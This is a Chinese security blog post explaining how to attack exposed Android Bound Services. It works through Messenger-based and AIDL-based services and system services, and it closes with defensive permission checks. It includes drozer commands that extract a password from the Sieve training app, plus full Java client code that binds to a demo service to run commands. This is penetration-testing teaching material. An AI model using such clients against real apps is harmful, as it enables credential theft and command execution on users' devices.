<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Android Bound Service攻击 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Android Bound Service攻击</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Android Bound Service攻击</h1><div class="post-meta">Mar 18, 2016<span> | </span><span class="category"><a href="/categories/移动安全/">移动安全</a></span></div><div class="post-content"><h3 id="0x00-引子"><a href="#0x00-引子" class="headerlink" title="0x00 引子"></a>0x00 引子</h3><p>去年12月，[1] 讲述了针对android bound service的攻击方法，给出了从apk包中恢复AIDL文件的工具，利用AIDL便可以编写攻击Bound Service的Client。拜这篇文章所赐，笔者也在实际测试工作中发现了类似漏洞，其中的过程却有些曲折。作为白帽子，通常情况下很难直接得到或者恢复AIDL文件，这决定了Bound Service的易守难攻，因此需要更加系统地掌握Bound Sercive的测试方法，并辅以耐心和一定的运气，才能发现类似的漏洞。在[1]的基础上，本文将分享此类漏洞的经验，进一步对Bound Service攻击进行说明。</p>
<h3 id="0x01-Bound-Service简介"><a href="#0x01-Bound-Service简介" class="headerlink" title="0x01 Bound Service简介"></a>0x01 Bound Service简介</h3><p>Bound Service提供了一种基于Binder的跨进程调用(IPC)机制，在其Service类中实现OnBind方法并返回用于IPC的IBinder对象。根据官方文档[2]，实现Bound Service有以下三种方式：</p>
<ul>
<li>继承Binder类</li>
<li>使用Messenger</li>
<li>使用AIDL</li>
</ul>
<p>由于第一种方式主要在同一进程中使用，因此我们主要关注后两种情况，只要Bound Service暴露，那么便可以编写恶意app，通过Messenger和基于AIDL的Bound Service进行跨进程通信，传入污染的数据或者直接调用被攻击应用的功能，最终对安全产生非预期的影响。</p>
<h3 id="0x02-攻击Messenger"><a href="#0x02-攻击Messenger" class="headerlink" title="0x02 攻击Messenger"></a>0x02 攻击Messenger</h3><p>Messenger是一种轻量级的IPC方案，其底层实现也是基于AIDL的，从android.os.Messenger的两个构造函数可以看到一些Binder的痕迹。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">    /**</div><div class="line">36     * Create a new Messenger pointing to the given Handler.  Any Message</div><div class="line">37     * objects sent through this Messenger will appear in the Handler as if</div><div class="line">38     * &#123;@link Handler#sendMessage(Message) Handler.sendMessage(Message)&#125; had</div><div class="line">39     * been called directly.</div><div class="line">40     *</div><div class="line">41     * @param target The Handler that will receive sent messages.</div><div class="line">42     */</div><div class="line">43    public Messenger(Handler target) &#123;</div><div class="line">44        mTarget = target.getIMessenger();</div><div class="line">45    &#125;</div><div class="line">    /**</div><div class="line">140     * Create a Messenger from a raw IBinder, which had previously been</div><div class="line">141     * retrieved with &#123;@link #getBinder&#125;.</div><div class="line">142     *</div><div class="line">143     * @param target The IBinder this Messenger should communicate with.</div><div class="line">144     */</div><div class="line">145    public Messenger(IBinder target) &#123;</div><div class="line">146        mTarget = IMessenger.Stub.asInterface(target);</div><div class="line">147    &#125;</div></pre></td></tr></table></figure>
<p>使用Messenger的Service典型实现中，一定会有一个继承于Handler的内部类，用来处理客户端发送过来的消息，测试方法就是检查Handler的handleMessage方法，观察发送特定的Message后会引起被攻击应用如何反应。Drozer中用于漏洞教学的Sieve程序给出了实际案例。</p>
<p>Sieve暴露了两个服务，这两个服务均使用Messenger进行跨进程通信</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">dz&gt; run app.service.info -a com.mwr.example.sieve</div><div class="line">Package: com.mwr.example.sieve</div><div class="line">  com.mwr.example.sieve.AuthService</div><div class="line">    Permission: null</div><div class="line">  com.mwr.example.sieve.CryptoService</div><div class="line">    Permission: null</div></pre></td></tr></table></figure>
<p>查看AuthService的handleMessage方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"> public void handleMessage(Message msg) &#123;</div><div class="line">...</div><div class="line">            Bundle v8 = null;</div><div class="line">            int v7 = 9234;</div><div class="line">            int v6 = 7452;</div><div class="line">            AuthService.this.responseHandler = msg.replyTo;</div><div class="line">            Object v2 = msg.obj;</div><div class="line">            switch(msg.what) &#123;</div><div class="line">                case 4: &#123;</div><div class="line">                    //Check if pin and password are set</div><div class="line">                &#125;</div><div class="line">                case 2354: &#123;</div><div class="line">                    if(msg.arg1 == v6) &#123;</div><div class="line">                      //Return pin Requires password from Bundle</div><div class="line">                    &#125;</div><div class="line">                    else if(msg.arg1 == v7) &#123;</div><div class="line">//Return password Requires pin from Bundle！！</div><div class="line">                        v1 = 41;</div><div class="line">                        if(AuthService.this.verifyPin(((Bundle)v2).getString(&quot;com.mwr.example.sieve.PIN&quot;))</div><div class="line">                                ) &#123;</div><div class="line">                            v2_1 = new Bundle();</div><div class="line">                            v2_1.putString(&quot;com.mwr.example.sieve.PASSWORD&quot;, AuthService.this.getKey());</div><div class="line">                            v3 = 0;</div><div class="line">                        &#125;</div><div class="line">...</div><div class="line">                    this.sendResponseMessage(5, v1, v3, v2_1);</div><div class="line">                    return;</div><div class="line">                label_57:</div><div class="line">                    this.sendUnrecognisedMessage();</div><div class="line">                    break;</div><div class="line">                &#125;</div><div class="line">                case 6345: &#123;</div><div class="line">                    if(msg.arg1 == v6) &#123;</div><div class="line">//Set Password Requires Current Password from Bundle</div><div class="line">                        v1 = 42;</div><div class="line">                        v3 = AuthService.this.setKey(((Bundle)v2).getString(&quot;com.mwr.example.sieve.PASSWORD&quot;))</div><div class="line">                                 ? 0 : 1;</div><div class="line">                    &#125;</div><div class="line">                    else if(msg.arg1 == v7) &#123;</div><div class="line">//Set Pin Requires Current Pin from Bundle</div><div class="line">                        v1 = 41;</div><div class="line">                        v3 = AuthService.this.setPin(((Bundle)v2).getString(&quot;com.mwr.example.sieve.PIN&quot;))</div><div class="line">                                 ? 0 : 1;</div><div class="line">                    &#125;</div><div class="line">                    else &#123;</div><div class="line">                        goto label_99;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    this.sendResponseMessage(4, v1, v3, v8);</div><div class="line">                    return;</div></pre></td></tr></table></figure>
<p>AuthService根据传入Message对象的不同，执行不同的动作，注意当Message对象的what为2354，arg1为9234时，如果当前的PIN正确，则可返回Sieve使用的主password。Drozer提供了app.service.send模块，利用该模块可以很方便地测试基于Messenger的跨进程通信。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 0 --extra string com.mwr.example.sieve.PIN 1234 --bundle-as-obj</div><div class="line">Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:</div><div class="line">  what: 5</div><div class="line">  arg1: 41</div><div class="line">  arg2: 0</div><div class="line">  Extras</div><div class="line">    com.mwr.example.sieve.PASSWORD (String) : passw0rd123123123</div></pre></td></tr></table></figure>
<p>如果PIN不正确，则只返回当前传入的PIN</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 33333 --extra string com.mwr.example.sieve.PIN 2344 --bundle-as-obj</div><div class="line">Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:</div><div class="line">  what: 5</div><div class="line">  arg1: 41</div><div class="line">  arg2: 1</div><div class="line">  Extras</div><div class="line">    com.mwr.example.sieve.PIN (String) : 2344</div></pre></td></tr></table></figure>
<p>由于PIN只有4位，利用上述两种结果的不同，可以编写程序进行爆破。另外一个CryptoService同样也有类似的漏洞，通过传入特定的Message对象，执行加解密操作，可被用来解密password，详见[3]。</p>
<h3 id="0x03-攻击基于AIDL的Bound-Service"><a href="#0x03-攻击基于AIDL的Bound-Service" class="headerlink" title="0x03 攻击基于AIDL的Bound Service"></a>0x03 攻击基于AIDL的Bound Service</h3><p>文献[1]给出了一个存在命令执行漏洞的Bound Service，并根据Bound Service的apk生成AIDL接口文件，编写攻击程序调用Bound Service中的命令执行方法。然而，在使用中发现生成AIDL文件的工具主要根据smali文件中的Stub.Proxy类进行抓取，而当apk进行了混淆，便不能正确生成AIDL文件了。例如，我们配置build.gradle中的minifyEnabledtrue开关为true，使用Android Studio的默认混淆规则。对混淆的apk与未混淆的apk使用JEB逆向对比如下</p>
<p><img src="/2016/03/18/android-bound-service/contract.png" alt="image"></p>
<p>混淆后的apk少了许多有关AIDL的信息，没有了Stub Proxy这些特征，致使如下代码实现的GenerateAIDL工具出错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">if (descriptorToDot(interfaces.first()).equals(IINTERFACE_CLASS)) &#123;</div><div class="line"></div><div class="line">    /* Now grab the Stub.Proxy, to get the protocols */</div><div class="line">    String stubProxyName = className + &quot;.Stub.Proxy&quot;;</div><div class="line">    DexBackedClassDef stubProxyDef = getStubProxy(classDefs, stubProxyName);</div><div class="line">    if (stubProxyDef == null) &#123;</div><div class="line">        System.err.println(&quot;[ERROR] Unable to find Stub.Proxy for class: &quot;</div><div class="line">                                                + stubProxyName + &quot;, Skiping!&quot;);</div><div class="line">        continue;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p><img src="/2016/03/18/android-bound-service/noAIDL.png" alt="image"></p>
<p>由于AIDL文件本质上只是SDK为我们提供的一种快速实现Binder的工具，因此完全可以不依赖AIDL文件而实现Binder的方法，这也是在实际渗透测试过程中最常见的情况。下面我们结合有漏洞混淆后的apk进行说明。</p>
<p>怀疑暴露的ITestService可传入一个可控字符串执行命令后，我们可以按如下步骤编写Client去Bind该Service进行测试。</p>
<p>首先，可声明一个AIDL性质的接口，可直接拷贝JEB中继承IInterface的a接口，该接口有一个a方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">// in fact a is TestInterface</div><div class="line">public interface a extends IInterface &#123;</div><div class="line">    static final String DESCRIPTOR = &quot;com.jakev.boundserver.aidl.TestInterface&quot;;</div><div class="line">    String a(String arg1) throws RemoteException;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接下来，编写实现a接口的Stub极其内部类Proxy，可参考系统生成的代码，结构略作调整使之清晰化。注意，一定要在Proxy类中实现a方法，其传入远程调用的code为1，打包数据data写入a方法中的字符串类型的参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line">public class Stub extends Binder implements a &#123;</div><div class="line">    /** Construct the stub at attach it to the interface. */</div><div class="line">    public Stub() &#123;</div><div class="line">        super();</div><div class="line">        this.attachInterface(this, DESCRIPTOR);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    /** Cast an IBinder object into an TestInterface(a) interface,</div><div class="line">     * generating a proxy if needed</div><div class="line">    */</div><div class="line">    public static a asInterface(IBinder obj) &#123;</div><div class="line">        if (obj == null) &#123;</div><div class="line">            return null;</div><div class="line">        &#125;</div><div class="line">        IInterface iin = obj.queryLocalInterface(DESCRIPTOR);</div><div class="line">        if(((iin != null) &amp;&amp; (iin instanceof a))) &#123;</div><div class="line">            return (a)iin;</div><div class="line">        &#125;</div><div class="line">        return new Stub.Proxy(obj);</div><div class="line">    &#125;</div><div class="line">    public IBinder asBinder() &#123;</div><div class="line">        return this;</div><div class="line">    &#125;</div><div class="line">    public boolean onTransact(int code, Parcel data, Parcel reply, int flag) throws RemoteException&#123;</div><div class="line">        boolean v0 = true;</div><div class="line">        switch(code) &#123;</div><div class="line">            case 1: &#123;</div><div class="line">                data.enforceInterface(DESCRIPTOR);</div><div class="line">                String v1 = this.a(data.readString());</div><div class="line">                reply.writeNoException();</div><div class="line">                reply.writeString(v1);</div><div class="line">                break;</div><div class="line">            &#125;</div><div class="line">            case 1598968902: &#123;</div><div class="line">                reply.writeString(DESCRIPTOR);</div><div class="line">                break;</div><div class="line">            &#125;</div><div class="line">            default: &#123;</div><div class="line">                v0 = super.onTransact(code, data, reply, flag);</div><div class="line">                break;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        return v0;</div><div class="line">    &#125;</div><div class="line">    public  String a(String cmd) throws RemoteException &#123;</div><div class="line">        // Server do not have to implement this method, just return null</div><div class="line">        return null;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    private static class Proxy implements a &#123;</div><div class="line">        private IBinder mRemote;</div><div class="line">        Proxy(IBinder remote) &#123;</div><div class="line">            mRemote = remote;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        @Override</div><div class="line">        public IBinder asBinder() &#123;</div><div class="line">            return mRemote;</div><div class="line">        &#125;</div><div class="line">        public String getInterfaceDescriptor() &#123;</div><div class="line">            return DESCRIPTOR;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        @Override</div><div class="line">        public String a(String cmd) throws RemoteException&#123;</div><div class="line">            String result = null;</div><div class="line">            Parcel data = Parcel.obtain();</div><div class="line">            Parcel reply = Parcel.obtain();</div><div class="line">            try &#123;</div><div class="line">                data.writeInterfaceToken(DESCRIPTOR);</div><div class="line">                data.writeString(cmd);</div><div class="line">                mRemote.transact(1, data, reply, 0);</div><div class="line">                reply.readException();</div><div class="line">                result = reply.readString();</div><div class="line">            &#125;</div><div class="line">            finally &#123;</div><div class="line">                reply.recycle();</div><div class="line">                data.recycle();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            return result;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后，编写攻击app的Activity，在其中bind有漏洞的Service</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mServiceConnection = new myServiceConnection();</div><div class="line">Intent i = new Intent();</div><div class="line">i.setClassName(&quot;com.jakev.boundserver&quot;, &quot;com.jakev.boundserver.ITestService&quot;);</div><div class="line">boolean ret = bindService(i, mServiceConnection, BIND_AUTO_CREATE);</div></pre></td></tr></table></figure>
<p>在ServiceConnection的回调函数中调用a方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">public void onServiceConnected(ComponentName name, IBinder service) &#123;</div><div class="line">    Log.d(TAG, &quot;OnServiceConnected &quot;);</div><div class="line">    String command = editCommand.getText().toString();</div><div class="line"></div><div class="line">    try &#123;</div><div class="line">        a mTestService = Stub.asInterface(service);</div><div class="line">        String result = mTestService.a(command);</div><div class="line">        Log.d(TAG, &quot;exec result is:&quot; + result);</div><div class="line">        txtResult.setText(result);</div><div class="line">    &#125; catch (RemoteException e) &#123;</div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>攻击效果如下<br><img src="/2016/03/18/android-bound-service/attackresult.png" alt="image"></p>
<p>至此，就完成了不依赖于AIDL文件攻击Bound Service的过程。</p>
<h3 id="0x04-攻击已注册的系统服务"><a href="#0x04-攻击已注册的系统服务" class="headerlink" title="0x04 攻击已注册的系统服务"></a>0x04 攻击已注册的系统服务</h3><p>通过adb shell service list可以查看在context manager（或servicemanager）中注册的系统服务名称和IBinder接口。</p>
<p><img src="/2016/03/18/android-bound-service/systemservice.png" alt="image"></p>
<p>这些服务也暴露了潜在的攻击面，可以编写客户端程序通过服务名获得Binder对象的引用，进而调用服务的功能或者传入污染的数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sp&lt;IServiceManager&gt; sm = defaultServiceManager();</div><div class="line">sp&lt;IBinder&gt; binder = sm-&gt;getService(String16(&quot;demo&quot;)); //demo is Service Name</div><div class="line">sp&lt;IDemo&gt; ServiceName = interface_cast&lt;IDemo&gt;(binder);</div></pre></td></tr></table></figure>
<p>构造Parcel对象data后，则可以通过binder-&gt;transact(int code, Parcel data, Parcel reply, int flag)调用系统服务。或者在具有服务实现源代码的情况下，直接通过ServcieName-&gt;ServiceMethod()调用系统服务实现的方法，具体可参考[4]。</p>
<p>一般情况下，系统服务都有严格的权限检查机制，漏洞更是罕见，但也有案例。<br>如，<a href="http://www.wooyun.org/bugs/wooyun-2010-081867" target="_blank" rel="external">三星手机随意访问RILD接口（可以解除定制机网络制式的软限制）</a>，作者在POC中给两种访问ITelephony服务sendOemRilRequestRaw接口的方法（Java和C）。</p>
<h3 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h3><p>除了在Manifest文件中对暴露的Service增加Signature的保护级别外，Binder还提供了更为灵活的验证方式</p>
<ul>
<li>使用Binder的静态方法getCallingPid或者getCallingUid来验证IPC调用者的身份，在获得调用者uid以后，可进一步使用PackageManager.getPackagesForUid(int uid)来获得调用者的包名，然后使用PackageManager.getPackageInfo(String Packagename, int flag)检查是否具有相应的权限（使用PackageManager.GET_PERMISSIONS flag）</li>
<li>在Service的OnBind方法中调用Context.checkCallingPermission(String permission)或者checkCallingPermissionOrSelf (String permission) 方法，验证IPC调用者是否拥有指定的权限，同样适用于Messenger；</li>
<li>使用Context.enforceCallingPermission(String permission, String message)，如果调用者不具备权限，自动抛出SecurityException</li>
</ul>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>[1] <a href="http://blog.thecobraden.com/2015/12/attacking-bound-services-on-android.html?m=1" target="_blank" rel="external">http://blog.thecobraden.com/2015/12/attacking-bound-services-on-android.html?m=1</a></p>
<p>[2] <a href="http://developer.android.com/guide/components/bound-services.html" target="_blank" rel="external">http://developer.android.com/guide/components/bound-services.html</a></p>
<p>[3] The Mobile Application Hackers Handbook</p>
<p>[4] <a href="http://ebixio.com/blog/2012/07/07/using-android-ipc-binders-from-native-code/" target="_blank" rel="external">http://ebixio.com/blog/2012/07/07/using-android-ipc-binders-from-native-code/</a></p>
</div><div class="tags"><a href="/tags/android/">android</a></div><div class="post-nav"><a href="/2016/03/19/cknife-opensource/" class="pre">跨平台版中国菜刀Cknife(C刀)更新开源</a><a href="/2016/03/01/es-explorer-vul/" class="next">ES文件浏览器组件暴露导致远程命令执行</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/IOS/">IOS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/未分类/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/二进制安全/">二进制安全</a></li></ul></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/android-drozer/" style="font-size: 15px;">android drozer</a> <a href="/tags/cknife/" style="font-size: 15px;">cknife</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-infoleak/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/Moto-bootloader-exploit/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/28/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/name-spoof/">“同形异义字”钓鱼攻击，钉钉中招</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/Bluetooth-Vul-2/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/06/bypass360-analysis/">分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/14/wannacry/">首发 | Wannacry勒索软件母体主程序逆向分析（含临时解决方案自动化工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/04/Bluetoooth_Vul_1/">蓝牙App漏洞系列分析之一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/21/android-telephony-dos/">Android Telephony拒绝服务漏洞（CVE-2016-6763）分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/08/details-telephodos/">Details of Denial of service vulnerability in Telephony  [CVE-2016-6763]</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com" title="aaa" target="_blank">aaa</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>